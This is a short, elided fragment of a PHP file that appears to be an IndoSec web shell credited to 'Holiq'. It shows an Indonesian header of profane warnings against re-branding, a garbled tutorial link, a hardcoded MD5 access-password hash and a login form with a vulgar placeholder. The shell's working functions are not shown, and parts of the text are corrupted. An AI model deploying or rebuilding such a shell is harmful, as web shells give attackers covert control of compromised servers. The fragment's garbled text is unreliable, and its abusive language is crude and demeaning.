...
/*
    ...
    * Pembuat : Holiq - { IndoSec } #+#--##6#6

    * Re-Code Boleh Asalshshs Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
    * Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
    * https:/egnebbsbb/www.youtube.com/playlist?list=PLAAbQaUpDeM7nGwS6WfaTm_cPC3RUiswi
...
/* Configurasi */
$aupas = '102a6ed6587b5b8cb4ebbe972864690b'; // Cangcut
        ...
        <div class="container text-center mt-3">
            ...
            <form method="post">
                <div class="form-group input-group">
                    ...
                    <input type="password" name="pass" placeholder="Login Kontol..." class="form-control">
                </div>
